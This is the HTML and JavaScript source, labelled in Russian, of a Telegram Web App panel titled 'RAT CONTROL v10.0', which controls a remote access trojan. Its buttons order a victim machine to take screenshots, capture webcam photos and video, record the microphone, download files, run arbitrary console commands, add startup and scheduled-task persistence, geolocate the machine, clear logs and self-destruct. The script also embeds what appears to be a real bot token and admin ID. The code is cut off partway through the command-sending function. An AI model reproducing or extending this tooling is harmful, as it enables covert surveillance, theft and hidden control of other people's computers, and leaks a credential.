<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAT CONTROL v10.0</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }

        body {
            background: #f0f2f5;
            color: #1a1a1a;
            padding: 16px;
            padding-bottom: 80px;
        }

        /* ===== –ù–ê–í–ò–ì–ê–¶–ò–Ø ===== */
        .nav-bar {
            background: linear-gradient(135deg, #2b6c8f, #1e4e6f);
            color: white;
            margin: -16px -16px 20px -16px;
            padding: 20px 16px;
            border-radius: 0 0 30px 30px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }

        .nav-bar h1 {
            font-size: 28px;
            margin-bottom: 4px;
            font-weight: 700;
        }

        .nav-bar p {
            font-size: 14px;
            opacity: 0.9;
        }

        .stats-row {
            display: flex;
            justify-content: space-between;
            margin-top: 15px;
            background: rgba(255,255,255,0.1);
            padding: 12px;
            border-radius: 15px;
        }

        .stat-item {
            text-align: center;
        }

        .stat-value {
            font-size: 18px;
            font-weight: bold;
        }

        .stat-label {
            font-size: 11px;
            opacity: 0.8;
        }

        /* ===== –í–ö–õ–ê–î–ö–ò ===== */
        .tabs {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 8px;
            background: white;
            padding: 8px;
            border-radius: 30px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }

        .tab {
            text-align: center;
            padding: 12px 4px;
            border-radius: 25px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            color: #666;
        }

        .tab.active {
            background: linear-gradient(135deg, #2b6c8f, #1e4e6f);
            color: white;
            box-shadow: 0 4px 10px rgba(43,108,143,0.3);
        }

        /* ===== –ö–ê–†–¢–û–ß–ö–ò ===== */
        .section {
            background: white;
            border-radius: 20px;
            padding: 18px;
            margin-bottom: 16px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
            border: 1px solid rgba(0,0,0,0.03);
        }

        .section-title {
            font-size: 16px;
            font-weight: 700;
            color: #1e4e6f;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
            border-bottom: 2px solid #f0f0f0;
            padding-bottom: 10px;
        }

        /* ===== –°–ï–¢–ö–ò –ö–ù–û–ü–û–ö ===== */
        .grid-2 {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin-bottom: 12px;
        }

        .grid-3 {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
        }

        .grid-4 {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 6px;
        }

        /* ===== –ö–ù–û–ü–ö–ò ===== */
        .btn {
            border: none;
            border-radius: 14px;
            padding: 14px 10px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            background: #f8f9fa;
            color: #333;
            border: 1px solid #eee;
        }

        .btn:active {
            transform: scale(0.97);
            background: #e9ecef;
        }

        .btn-primary {
            background: linear-gradient(135deg, #2b6c8f, #1e4e6f);
            color: white;
            border: none;
        }

        .btn-success {
            background: linear-gradient(135deg, #28a745, #218838);
            color: white;
        }

        .btn-warning {
            background: linear-gradient(135deg, #ffc107, #e0a800);
            color: #333;
        }

        .btn-danger {
            background: linear-gradient(135deg, #dc3545, #c82333);
            color: white;
        }

        .btn-info {
            background: linear-gradient(135deg, #17a2b8, #138496);
            color: white;
        }

        .btn-purple {
            background: linear-gradient(135deg, #6f42c1, #5a32a3);
            color: white;
        }

        /* ===== –ü–û–õ–Ø –í–í–û–î–ê ===== */
        .input-group {
            display: flex;
            gap: 8px;
            margin: 12px 0;
        }

        .input {
            flex: 1;
            padding: 14px;
            border: 2px solid #e0e0e0;
            border-radius: 14px;
            font-size: 14px;
            transition: all 0.2s;
            background: #fafafa;
        }

        .input:focus {
            outline: none;
            border-color: #2b6c8f;
            background: white;
        }

        /* ===== –û–ë–õ–ê–°–¢–ò –í–´–í–û–î–ê ===== */
        .output {
            background: #f8f9fa;
            border-radius: 16px;
            padding: 16px;
            margin-top: 15px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.6;
            white-space: pre-wrap;
            max-height: 350px;
            overflow-y: auto;
            border: 2px solid #e9ecef;
        }

        .output-title {
            font-weight: bold;
            color: #1e4e6f;
            margin-bottom: 10px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        /* ===== –§–ê–ô–õ–û–í–´–ô –ú–ï–ù–ï–î–ñ–ï–† ===== */
        .path-bar {
            background: #f0f2f5;
            padding: 14px;
            border-radius: 14px;
            margin-bottom: 15px;
            font-family: monospace;
            font-size: 13px;
            word-break: break-all;
            border: 2px solid #e0e0e0;
        }

        .file-list {
            margin-top: 15px;
            max-height: 350px;
            overflow-y: auto;
            border: 2px solid #e9ecef;
            border-radius: 16px;
        }

        .file-item {
            display: flex;
            align-items: center;
            padding: 14px;
            border-bottom: 1px solid #e9ecef;
            cursor: pointer;
            transition: background 0.2s;
        }

        .file-item:hover {
            background: #f1f3f5;
        }

        .file-icon {
            width: 35px;
            font-size: 20px;
        }

        .file-name {
            flex: 1;
            font-weight: 500;
            font-size: 14px;
        }

        .file-size {
            color: #666;
            font-size: 12px;
            margin-right: 15px;
        }

        .file-date {
            color: #666;
            font-size: 11px;
        }

        /* ===== –ü–†–û–¶–ï–°–°–´ ===== */
        .proc-table {
            border: 2px solid #e9ecef;
            border-radius: 16px;
            overflow: hidden;
        }

        .proc-header {
            display: grid;
            grid-template-columns: 70px 1fr 80px 80px;
            background: linear-gradient(135deg, #2b6c8f, #1e4e6f);
            color: white;
            padding: 14px 10px;
            font-weight: 600;
            font-size: 13px;
        }

        .proc-row {
            display: grid;
            grid-template-columns: 70px 1fr 80px 80px;
            padding: 12px 10px;
            border-bottom: 1px solid #e9ecef;
            font-size: 12px;
        }

        .proc-row:hover {
            background: #f8f9fa;
        }

        .proc-pid { color: #2b6c8f; font-weight: 500; }
        .proc-cpu { text-align: right; color: #28a745; }
        .proc-ram { text-align: right; color: #17a2b8; }

        /* ===== –°–¢–ê–¢–£–° ===== */
        .status-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: white;
            padding: 15px 20px;
            border-top: 2px solid #e0e0e0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            backdrop-filter: blur(10px);
            box-shadow: 0 -4px 12px rgba(0,0,0,0.05);
        }

        .status-text {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #2b6c8f;
            font-weight: 500;
        }

        .status-dot {
            width: 10px;
            height: 10px;
            background: #28a745;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.6; transform: scale(1.1); }
            100% { opacity: 1; transform: scale(1); }
        }

        .close-btn {
            background: #f8f9fa;
            border: 2px solid #e0e0e0;
            border-radius: 25px;
            padding: 8px 25px;
            font-weight: 600;
            color: #666;
            cursor: pointer;
            transition: all 0.2s;
        }

        .close-btn:active {
            background: #e0e0e0;
        }

        /* ===== –ü–†–û–ì–†–ï–°–° –ë–ê–†–´ ===== */
        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e9ecef;
            border-radius: 4px;
            margin: 10px 0;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #2b6c8f, #4a9fd8);
            border-radius: 4px;
            transition: width 0.3s;
        }

        /* ===== –ê–ù–ò–ú–ê–¶–ò–ò ===== */
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .loading {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 3px solid #f3f3f3;
            border-top-color: #2b6c8f;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
    </style>
</head>
<body>
    <div class="nav-bar">
        <h1>ü§ñ RAT CONTROL v10.0</h1>
        <p>–ü–æ–ª–Ω–æ–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º</p>
        <div class="stats-row">
            <div class="stat-item">
                <div class="stat-value" id="cpuStat">0%</div>
                <div class="stat-label">CPU</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="ramStat">0%</div>
                <div class="stat-label">RAM</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="diskStat">0%</div>
                <div class="stat-label">–î–∏—Å–∫</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="procStat">0</div>
                <div class="stat-label">–ü—Ä–æ—Ü–µ—Å—Å—ã</div>
            </div>
        </div>
    </div>

    <div class="tabs">
        <div class="tab active" onclick="switchTab('dashboard')">üìä –î–∞—à–±–æ—Ä–¥</div>
        <div class="tab" onclick="switchTab('system')">‚öôÔ∏è –°–∏—Å—Ç–µ–º–∞</div>
        <div class="tab" onclick="switchTab('files')">üìÅ –§–∞–π–ª—ã</div>
        <div class="tab" onclick="switchTab('network')">üåê –°–µ—Ç—å</div>
        <div class="tab" onclick="switchTab('processes')">üìã –ü—Ä–æ—Ü–µ—Å—Å—ã</div>
        <div class="tab" onclick="switchTab('media')">üé• –ú–µ–¥–∏–∞</div>
        <div class="tab" onclick="switchTab('control')">‚ö° –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ</div>
        <div class="tab" onclick="switchTab('info')">‚ÑπÔ∏è –ò–Ω—Ñ–æ</div>
    </div>

    <!-- ==================== –î–ê–®–ë–û–†–î ==================== -->
    <div id="tab-dashboard" class="tab-content active">
        <div class="section">
            <div class="section-title">
                <span>üìä –ú–û–ù–ò–¢–û–†–ò–ù–ì –°–ò–°–¢–ï–ú–´ –í –†–ï–ê–õ–¨–ù–û–ú –í–†–ï–ú–ï–ù–ò</span>
            </div>
            
            <div class="grid-2">
                <div>
                    <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                        <span>üíª –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä</span>
                        <span id="cpuPercent">0%</span>
                    </div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="cpuProgress" style="width: 0%"></div>
                    </div>
                    
                    <div style="display: flex; justify-content: space-between; margin: 10px 0 5px;">
                        <span>üíæ –û–ø–µ—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–º—è—Ç—å</span>
                        <span id="ramPercent">0%</span>
                    </div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="ramProgress" style="width: 0%"></div>
                    </div>
                    
                    <div style="display: flex; justify-content: space-between; margin: 10px 0 5px;">
                        <span>üíø –î–∏—Å–∫ C:</span>
                        <span id="diskPercent">0%</span>
                    </div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="diskProgress" style="width: 0%"></div>
                    </div>
                </div>
                
                <div style="background: #f8f9fa; padding: 15px; border-radius: 16px;">
                    <div style="font-weight: bold; margin-bottom: 10px;">üìà –ò–ù–§–û–†–ú–ê–¶–ò–Ø</div>
                    <div id="quickInfo">–ó–∞–≥—Ä—É–∑–∫–∞...</div>
                </div>
            </div>
            
            <div class="grid-2" style="margin-top: 15px;">
                <button class="btn btn-primary" onclick="sendCommand('system_info')">
                    üîÑ –û–±–Ω–æ–≤–∏—Ç—å —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
                </button>
                <button class="btn btn-info" onclick="startAutoRefresh()">
                    ‚è±Ô∏è –ê–≤—Ç–æ–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ (5—Å)
                </button>
            </div>
        </div>

        <div class="section">
            <div class="section-title">‚ö° –ë–´–°–¢–†–´–ï –î–ï–ô–°–¢–í–ò–Ø</div>
            <div class="grid-3">
                <button class="btn btn-success" onclick="sendCommand('screen')">üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç</button>
                <button class="btn btn-warning" onclick="sendCommand('lock')">üîí –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞</button>
                <button class="btn btn-danger" onclick="sendCommand('shutdown')">‚èª –í—ã–∫–ª</button>
            </div>
        </div>
    </div>

    <!-- ==================== –°–ò–°–¢–ï–ú–ê ==================== -->
    <div id="tab-system" class="tab-content">
        <div class="section">
            <div class="section-title">üñ•Ô∏è –ü–û–õ–ù–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø –û –°–ò–°–¢–ï–ú–ï</div>
            <div class="grid-2">
                <button class="btn btn-primary" onclick="sendCommand('system_info')">üìä –û–±—â–∞—è</button>
                <button class="btn btn-info" onclick="sendCommand('cpu_info')">‚öôÔ∏è CPU</button>
                <button class="btn btn-success" onclick="sendCommand('ram_info')">üíæ RAM</button>
                <button class="btn btn-warning" onclick="sendCommand('disk_info')">üíø –î–∏—Å–∫–∏</button>
                <button class="btn btn-purple" onclick="sendCommand('battery_info')">üîã –ë–∞—Ç–∞—Ä–µ—è</button>
                <button class="btn" onclick="sendCommand('temperature_info')">üå°Ô∏è –¢–µ–º–ø–µ—Ä–∞—Ç—É—Ä–∞</button>
            </div>
            <div id="systemOutput" class="output">–ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏</div>
        </div>

        <div class="section">
            <div class="section-title">üì¶ –û–ë–û–†–£–î–û–í–ê–ù–ò–ï</div>
            <div class="grid-2">
                <button class="btn" onclick="sendCommand('hardware_info')">üñ•Ô∏è –ú–∞—Ç–µ—Ä–∏–Ω—Å–∫–∞—è –ø–ª–∞—Ç–∞</button>
                <button class="btn" onclick="sendCommand('gpu_info')">üéÆ –í–∏–¥–µ–æ–∫–∞—Ä—Ç–∞</button>
                <button class="btn" onclick="sendCommand('drives_info')">üíΩ –ù–∞–∫–æ–ø–∏—Ç–µ–ª–∏</button>
                <button class="btn" onclick="sendCommand('usb_info')">üîå USB —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞</button>
            </div>
            <div id="hardwareOutput" class="output"></div>
        </div>
    </div>

    <!-- ==================== –§–ê–ô–õ–´ ==================== -->
    <div id="tab-files" class="tab-content">
        <div class="section">
            <div class="section-title">üìÅ –§–ê–ô–õ–û–í–´–ô –ú–ï–ù–ï–î–ñ–ï–†</div>
            
            <div class="path-bar" id="currentPath">C:\</div>
            
            <div class="grid-3">
                <button class="btn btn-primary" onclick="sendCommand('list_files')">üìã –°–ø–∏—Å–æ–∫</button>
                <button class="btn btn-warning" onclick="sendCommand('go_back')">‚¨ÜÔ∏è –ù–∞–∑–∞–¥</button>
                <button class="btn btn-info" onclick="sendCommand('refresh_files')">üîÑ –û–±–Ω–æ–≤–∏—Ç—å</button>
            </div>

            <div class="input-group">
                <input type="text" id="folderInput" class="input" placeholder="–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ –ø–∞–ø–∫–µ (–Ω–∞–ø—Ä–∏–º–µ—Ä: C:\Windows)">
                <button class="btn btn-primary" onclick="changeDir()" style="flex: 0 0 80px;">–ü–µ—Ä–µ–π—Ç–∏</button>
            </div>

            <div class="grid-2">
                <div class="input-group">
                    <input type="text" id="fileName" class="input" placeholder="–ò–º—è —Ñ–∞–π–ª–∞ –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è">
                    <button class="btn btn-success" onclick="downloadFile()">üì•</button>
                </div>
                <div class="input-group">
                    <input type="text" id="newFolderName" class="input" placeholder="–ù–æ–≤–∞—è –ø–∞–ø–∫–∞">
                    <button class="btn btn-warning" onclick="createFolder()">üìÅ+</button>
                </div>
            </div>

            <div class="grid-2">
                <div class="input-group">
                    <input type="text" id="oldName" class="input" placeholder="–°—Ç–∞—Ä–æ–µ –∏–º—è">
                    <input type="text" id="newName" class="input" placeholder="–ù–æ–≤–æ–µ –∏–º—è">
                    <button class="btn btn-info" onclick="renameItem()">‚úèÔ∏è</button>
                </div>
            </div>

            <div class="grid-2">
                <div class="input-group">
                    <input type="text" id="copySource" class="input" placeholder="–û—Ç–∫—É–¥–∞">
                    <input type="text" id="copyDest" class="input" placeholder="–ö—É–¥–∞">
                    <button class="btn" onclick="copyItem()">üìã</button>
                </div>
            </div>

            <div class="grid-2">
                <div class="input-group">
                    <input type="text" id="searchQuery" class="input" placeholder="–ü–æ–∏—Å–∫ —Ñ–∞–π–ª–æ–≤">
                    <button class="btn btn-info" onclick="searchFiles()">üîç</button>
                </div>
                <button class="btn btn-purple" onclick="sendCommand('disk_usage')">üíø –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –¥–∏—Å–∫–∞</button>
            </div>

            <div id="fileList" class="file-list"></div>
        </div>
    </div>

    <!-- ==================== –°–ï–¢–¨ ==================== -->
    <div id="tab-network" class="tab-content">
        <div class="section">
            <div class="section-title">üåê –°–ï–¢–ï–í–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø</div>
            <div class="grid-2">
                <button class="btn btn-primary" onclick="sendCommand('network_info')">üì° –û—Å–Ω–æ–≤–Ω–∞—è</button>
                <button class="btn btn-success" onclick="sendCommand('external_ip')">üåç –í–Ω–µ—à–Ω–∏–π IP</button>
                <button class="btn btn-info" onclick="sendCommand('wifi_info')">üì∂ Wi-Fi —Å–µ—Ç–∏</button>
                <button class="btn btn-warning" onclick="sendCommand('connections')">üîó –°–æ–µ–¥–∏–Ω–µ–Ω–∏—è</button>
                <button class="btn" onclick="sendCommand('bandwidth')">üìä –¢—Ä–∞—Ñ–∏–∫</button>
                <button class="btn" onclick="sendCommand('network_stats')">üìà –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞</button>
            </div>
            <div id="networkOutput" class="output"></div>
        </div>

        <div class="section">
            <div class="section-title">üìç –ì–ï–û–õ–û–ö–ê–¶–ò–Ø</div>
            <div class="grid-2">
                <button class="btn btn-primary" onclick="sendCommand('geolocation')">üåç –û–ø—Ä–µ–¥–µ–ª–∏—Ç—å –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ</button>
                <button class="btn btn-info" onclick="sendCommand('ip_info')">üîç –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –ø–æ IP</button>
            </div>
            <div id="geoOutput" class="output"></div>
        </div>
    </div>

    <!-- ==================== –ü–†–û–¶–ï–°–°–´ ==================== -->
    <div id="tab-processes" class="tab-content">
        <div class="section">
            <div class="section-title">üìã –ú–ï–ù–ï–î–ñ–ï–† –ü–†–û–¶–ï–°–°–û–í</div>
            
            <div class="grid-3">
                <button class="btn btn-primary" onclick="sendCommand('processes')">üìä –í—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã</button>
                <button class="btn btn-success" onclick="sendCommand('top_cpu')">‚ö° –ü–æ CPU</button>
                <button class="btn btn-info" onclick="sendCommand('top_ram')">üíæ –ü–æ RAM</button>
            </div>

            <div class="grid-2" style="margin-top: 10px;">
                <div class="input-group">
                    <input type="number" id="processPid" class="input" placeholder="PID –ø—Ä–æ—Ü–µ—Å—Å–∞">
                    <button class="btn btn-danger" onclick="killProcess()">üî™ –£–±–∏—Ç—å</button>
                </div>
                <div class="input-group">
                    <input type="text" id="processName" class="input" placeholder="–ò–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞">
                    <button class="btn btn-warning" onclick="killProcessByName()">üî™ –ü–æ –∏–º–µ–Ω–∏</button>
                </div>
            </div>

            <div class="grid-2">
                <button class="btn" onclick="sendCommand('process_tree')">üå≥ –î–µ—Ä–µ–≤–æ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤</button>
                <button class="btn" onclick="sendCommand('process_stats')">üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞</button>
            </div>

            <div class="proc-table" style="margin-top: 15px;">
                <div class="proc-header">
                    <span>PID</span>
                    <span>–ò–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞</span>
                    <span>CPU %</span>
                    <span>RAM %</span>
                </div>
                <div id="processesList"></div>
            </div>
        </div>
    </div>

    <!-- ==================== –ú–ï–î–ò–ê ==================== -->
    <div id="tab-media" class="tab-content">
        <div class="section">
            <div class="section-title">üé• –ó–ê–•–í–ê–¢ –ú–ï–î–ò–ê</div>
            <div class="grid-2">
                <button class="btn btn-primary" onclick="sendCommand('screen')">üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç</button>
                <button class="btn btn-success" onclick="sendCommand('screen_full')">üñ•Ô∏è –í–µ—Å—å —ç–∫—Ä–∞–Ω</button>
                <button class="btn btn-info" onclick="sendCommand('screen_window')">ü™ü –ê–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ</button>
                <button class="btn btn-warning" onclick="sendCommand('webcam')">üì∑ –§–æ—Ç–æ —Å –≤–µ–±–∫–∏</button>
                <button class="btn" onclick="sendCommand('webcam_video')">üé• –í–∏–¥–µ–æ 10—Å</button>
                <button class="btn" onclick="sendCommand('mic')">üé§ –ê—É–¥–∏–æ 10—Å</button>
                <button class="btn" onclick="sendCommand('mic_30')">üé§ –ê—É–¥–∏–æ 30—Å</button>
                <button class="btn" onclick="sendCommand('mic_60')">üé§ –ê—É–¥–∏–æ 60—Å</button>
            </div>
        </div>

        <div class="section">
            <div class="section-title">üé¨ –î–û–ü–û–õ–ù–ò–¢–ï–õ–¨–ù–û</div>
            <div class="grid-2">
                <button class="btn" onclick="sendCommand('record_start')">‚è∫Ô∏è –ù–∞—á–∞—Ç—å –∑–∞–ø–∏—Å—å</button>
                <button class="btn" onclick="sendCommand('record_stop')">‚èπÔ∏è –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å</button>
                <button class="btn" onclick="sendCommand('screenshot_delay')">‚è±Ô∏è –°–∫—Ä–∏–Ω—à–æ—Ç —á–µ—Ä–µ–∑ 5—Å</button>
                <button class="btn" onclick="sendCommand('camera_list')">üìã –°–ø–∏—Å–æ–∫ –∫–∞–º–µ—Ä</button>
            </div>
        </div>
    </div>

    <!-- ==================== –£–ü–†–ê–í–õ–ï–ù–ò–ï ==================== -->
    <div id="tab-control" class="tab-content">
        <div class="section">
            <div class="section-title">‚ö° –£–ü–†–ê–í–õ–ï–ù–ò–ï –ü–ò–¢–ê–ù–ò–ï–ú</div>
            <div class="grid-2">
                <button class="btn btn-danger" onclick="sendCommand('shutdown')">‚èª –í—ã–∫–ª—é—á–∏—Ç—å</button>
                <button class="btn btn-warning" onclick="sendCommand('restart')">üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å</button>
                <button class="btn btn-info" onclick="sendCommand('logout')">üëã –í—ã–π—Ç–∏</button>
                <button class="btn btn-primary" onclick="sendCommand('lock')">üîí –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞</button>
                <button class="btn btn-secondary" onclick="sendCommand('sleep')">üò¥ –°–æ–Ω</button>
                <button class="btn btn-secondary" onclick="sendCommand('hibernate')">üí§ –ì–∏–±–µ—Ä–Ω–∞—Ü–∏—è</button>
            </div>
        </div>

        <div class="section">
            <div class="section-title">üíª –ö–û–ù–°–û–õ–¨</div>
            <div class="input-group">
                <input type="text" id="consoleCommand" class="input" placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É">
                <button class="btn btn-primary" onclick="runCommand()">‚ö° –í—ã–ø–æ–ª–Ω–∏—Ç—å</button>
            </div>
            <div class="grid-2">
                <button class="btn" onclick="sendCommand('cmd', {cmd: 'dir'})">üìÅ dir</button>
                <button class="btn" onclick="sendCommand('cmd', {cmd: 'ipconfig'})">üåê ipconfig</button>
                <button class="btn" onclick="sendCommand('cmd', {cmd: 'systeminfo'})">üìä systeminfo</button>
                <button class="btn" onclick="sendCommand('cmd', {cmd: 'tasklist'})">üìã tasklist</button>
            </div>
            <div id="consoleOutput" class="output"></div>
        </div>

        <div class="section">
            <div class="section-title">üìÖ –ü–õ–ê–ù–ò–†–û–í–©–ò–ö</div>
            <div class="grid-2">
                <button class="btn" onclick="sendCommand('schedule_list')">üìã –°–ø–∏—Å–æ–∫ –∑–∞–¥–∞—á</button>
                <button class="btn" onclick="sendCommand('schedule_create')">‚ûï –°–æ–∑–¥–∞—Ç—å –∑–∞–¥–∞—á—É</button>
                <button class="btn" onclick="sendCommand('schedule_delete')">‚ùå –£–¥–∞–ª–∏—Ç—å –∑–∞–¥–∞—á—É</button>
                <button class="btn" onclick="sendCommand('schedule_run')">‚ñ∂Ô∏è –ó–∞–ø—É—Å—Ç–∏—Ç—å —Å–µ–π—á–∞—Å</button>
            </div>
        </div>

        <div class="section">
            <div class="section-title">üöÄ –ê–í–¢–û–ó–ê–ì–†–£–ó–ö–ê</div>
            <div class="grid-2">
                <button class="btn" onclick="sendCommand('startup_list')">üìã –°–ø–∏—Å–æ–∫</button>
                <button class="btn" onclick="sendCommand('startup_add')">‚ûï –î–æ–±–∞–≤–∏—Ç—å</button>
                <button class="btn" onclick="sendCommand('startup_remove')">‚ûñ –£–¥–∞–ª–∏—Ç—å</button>
                <button class="btn" onclick="sendCommand('startup_folder')">üìÅ –û—Ç–∫—Ä—ã—Ç—å –ø–∞–ø–∫—É</button>
            </div>
        </div>
    </div>

    <!-- ==================== –ò–ù–§–û ==================== -->
    <div id="tab-info" class="tab-content">
        <div class="section">
            <div class="section-title">‚ÑπÔ∏è –û –°–ò–°–¢–ï–ú–ï</div>
            <div class="grid-2">
                <button class="btn" onclick="sendCommand('os_info')">üíø –û–°</button>
                <button class="btn" onclick="sendCommand('user_info')">üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</button>
                <button class="btn" onclick="sendCommand('env_info')">üåç –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ</button>
                <button class="btn" onclick="sendCommand('uptime')">‚è±Ô∏è –í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã</button>
                <button class="btn" onclick="sendCommand('date_time')">üìÖ –î–∞—Ç–∞/–≤—Ä–µ–º—è</button>
                <button class="btn" onclick="sendCommand('locale')">üó∫Ô∏è –õ–æ–∫–∞–ª–∏–∑–∞—Ü–∏—è</button>
            </div>
            <div id="infoOutput" class="output"></div>
        </div>

        <div class="section">
            <div class="section-title">üîß –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê</div>
            <div class="grid-2">
                <button class="btn" onclick="sendCommand('event_log')">üìã –ñ—É—Ä–Ω–∞–ª —Å–æ–±—ã—Ç–∏–π</button>
                <button class="btn" onclick="sendCommand('error_log')">‚ö†Ô∏è –û—à–∏–±–∫–∏</button>
                <button class="btn" onclick="sendCommand('performance')">üìä –ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å</button>
                <button class="btn" onclick="sendCommand('system_health')">üíì –ó–¥–æ—Ä–æ–≤—å–µ —Å–∏—Å—Ç–µ–º—ã</button>
            </div>
        </div>

        <div class="section">
            <div class="section-title">üíÄ –û–ü–ê–°–ù–´–ï –§–£–ù–ö–¶–ò–ò</div>
            <div class="grid-2">
                <button class="btn btn-danger" onclick="sendCommand('selfdestruct')">üíÄ –°–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ</button>
                <button class="btn btn-warning" onclick="sendCommand('clear_logs')">üßπ –û—á–∏—Å—Ç–∏—Ç—å –ª–æ–≥–∏</button>
            </div>
        </div>
    </div>

    <!-- ==================== –°–¢–ê–¢–£–° –ë–ê–† ==================== -->
    <div class="status-bar">
        <div class="status-text">
            <span class="status-dot"></span>
            <span id="statusMessage">–ì–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ</span>
        </div>
        <button class="close-btn" onclick="closeApp()">–ó–ê–ö–†–´–¢–¨</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();
        
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
        const BOT_TOKEN = '8417099264:AAHZ_xx4NfBLs04BoGyutO0_dwaa66b-ECo';
        const ADMIN_ID = 7266658879;
        
        // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
        let currentDir = 'C:\\';
        let lastUpdateId = 0;
        let autoRefresh = false;
        let refreshInterval = null;
        let commandHistory = [];
        let favorites = JSON.parse(localStorage.getItem('favorites') || '{}');
        
        // ==================== –£–ü–†–ê–í–õ–ï–ù–ò–ï –í–ö–õ–ê–î–ö–ê–ú–ò ====================
        function switchTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            
            event.target.classList.add('active');
            document.getElementById(`tab-${tabName}`).classList.add('active');
            
            // –ó–∞–≥—Ä—É–∂–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø—Ä–∏ –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–∏
            if (tabName === 'dashboard') loadDashboard();
            if (tabName === 'files') loadFiles();
            if (tabName === 'processes') loadProcesses();
        }

        // ==================== –û–¢–ü–†–ê–í–ö–ê –ö–û–ú–ê–ù–î ====================
        function sendCommand(action, params = {}) {
            const command = {
                action: action,
                params: params,
                timestamp: Date.now(),
                id: Math.random().toString(36).substring(7)
            };
            
            commandHistory.push(command);
            updateStatus(`‚è≥ –û—Ç–ø—Ä–∞–≤–∫–∞: ${action}...`);
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ localStorage
            localStorage.setItem('lastCommand', JSON.stringify(command));
            
